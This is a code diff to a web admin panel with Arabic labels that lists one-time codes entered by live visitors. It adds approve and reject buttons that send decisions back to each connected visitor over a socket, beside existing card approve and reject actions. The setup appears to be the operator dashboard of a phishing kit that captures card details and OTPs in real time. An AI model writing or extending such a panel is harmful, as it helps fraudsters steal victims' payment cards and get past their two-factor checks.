@@ -515,10 +515,16 @@
         html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
         html += '<h3 class="font-bold mb-3 text-orange-800">🔢 الرموز المدخلة</h3>';
         html += '<div class="space-y-2">';
-        visitor.digitCodes.forEach(dc => {
-          html += '<div class="flex justify-between items-center bg-white p-3 rounded-lg">';
+        visitor.digitCodes.forEach((dc, index) => {
+          html += '<div class="bg-white p-3 rounded-lg">';
+          html += '<div class="flex justify-between items-center mb-2">';
           html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
           html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
+          html += '</div>';
+          html += '<div class="flex gap-2">';
+          html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+          html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+          html += '</div>';
           html += '</div>';
         });
         html += '</div></div>';
@@ -720,6 +726,15 @@
 
     function cardActionReject(socketId) {
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
+    }
+
+    // Code action functions (for OTP/digit codes)
+    function codeActionApprove(socketId, codeIndex) {
+      socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
+    }
+
+    function codeActionReject(socketId, codeIndex) {
+      socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
     }
 
     function sendMessage(socketId) {
